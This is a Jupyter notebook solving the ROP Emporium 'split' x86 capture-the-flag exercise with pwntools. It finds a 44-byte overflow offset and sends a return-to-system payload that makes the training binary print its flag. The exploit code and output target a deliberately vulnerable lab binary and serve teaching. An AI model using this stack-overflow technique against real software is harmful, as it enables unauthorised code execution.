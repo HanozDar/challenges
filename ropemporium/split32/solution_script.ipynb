{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9a9bf67d",
   "metadata": {},
   "source": [
    "# Solution for Split - ROP Emporium - x86"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "36a0ac3b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pwn\n",
    "from pwn import *"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2645292d",
   "metadata": {},
   "source": [
    "Let's analyse the code and see what we're working with\n",
    "```text\n",
    "split32: ELF 32-bit LSB executable,\n",
    "```\n",
    "Let's see what the options on the binary are\n",
    "```text\n",
    "gdb-peda checksec\n",
    "CANARY    : disabled\n",
    "FORTIFY   : disabled\n",
    "NX        : ENABLED\n",
    "PIE       : disabled\n",
    "RELRO     : Partial\n",
    "```\n",
    "Now that we have a good idea, let's go further and analyse the functions,\n",
    "```text\n",
    "0x08048546  main\n",
    "0x080485ad  pwnme\n",
    "0x0804860c  usefulFunction\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d1b6082d",
   "metadata": {},
   "source": [
    "The main only calls the pwnme function\n",
    "In the pwnme function, there is a buffer overflow. \n",
    "Buffer is of size 32 and input is allowed of 96 bytes\n",
    "There is also an interesting function called usefulFunction that calls\n",
    "```text\n",
    "system(\"/bin/ls\")\n",
    "```\n",
    "The challenge suggests we can use the system function. Then let's also search the strings in the program in that case, because NX is enabled\n",
    "```text\n",
    "0804a030\tusefulString\tds \"/bin/cat flag.txt\"\t\"/bin/cat flag.txt\"\tstring\t18\ttrue\n",
    "```\n",
    "Now we have the address of a string that is called \"cat flag.txt\". Now we only have to effectively call \n",
    "system(\"cat flag.txt\") and we have the flag.\n",
    "Let's get started. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "6886fdf1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Starting local process './split32'\n",
      "[+] Starting local process './split32': pid 14359\n",
      "[*] '/home/hanoz/Desktop/ropemporium/split/split32/split32'\n",
      "    Arch:     i386-32-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    No canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      No PIE (0x8048000)\n"
     ]
    }
   ],
   "source": [
    "p = process('./split32')\n",
    "elf = ELF('./split32')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "aeabd623",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'split by ROP Emporium\\nx86\\n\\nContriving a reason to ask user for data...\\n> '\n"
     ]
    }
   ],
   "source": [
    "init_recvd = p.recv()\n",
    "print(init_recvd)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "eb09fa58",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Process './split32' stopped with exit code -11 (SIGSEGV) (pid 14290)\n",
      "[x] Parsing corefile...\n",
      "[*] '/home/hanoz/Desktop/ropemporium/split/split32/core.14290'\n",
      "    Arch:      i386-32-little\n",
      "    EIP:       0x6161616c\n",
      "    ESP:       0xffb85730\n",
      "    Exe:       '/home/hanoz/Desktop/ropemporium/split/split32/split32' (0x8048000)\n",
      "    Fault:     0x6161616c\n",
      "[+] Parsing corefile...: Done\n",
      "[+] We have found the offset at location 44\n"
     ]
    }
   ],
   "source": [
    "x = 50\n",
    "payload = cyclic(x,n=4) \n",
    "p.sendline(payload)\n",
    "\n",
    "p.wait()\n",
    "core = p.corefile\n",
    "\n",
    "offset = cyclic_find(core.fault_addr)\n",
    "log.success(\"We have found the offset at location \" + str(offset))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "ae4bb9f0",
   "metadata": {},
   "outputs": [],
   "source": [
    "buffer = b\"A\"*44\n",
    "system_addr = elf.symbols['system']\n",
    "system_addr_pld = p32(system_addr)\n",
    "cat_flag_addr = 0x0804a030\n",
    "cat_flag_addr_pld = p32(cat_flag_addr)\n",
    "payload = buffer + system_addr_pld + b\"BBBB\" + cat_flag_addr_pld\n",
    "p.sendline(payload)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "c655eb8d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Process './split32' stopped with exit code -11 (SIGSEGV) (pid 14359)\n",
      "b'Thank you!\\nROPE{a_placeholder_32byte_flag!}'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/tmp/ipykernel_14346/1118392199.py:1: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n",
      "  flag_line = p.recvuntil(\"}\")\n"
     ]
    }
   ],
   "source": [
    "flag_line = p.recvuntil(\"}\")\n",
    "print(flag_line)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4fd0a4af",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
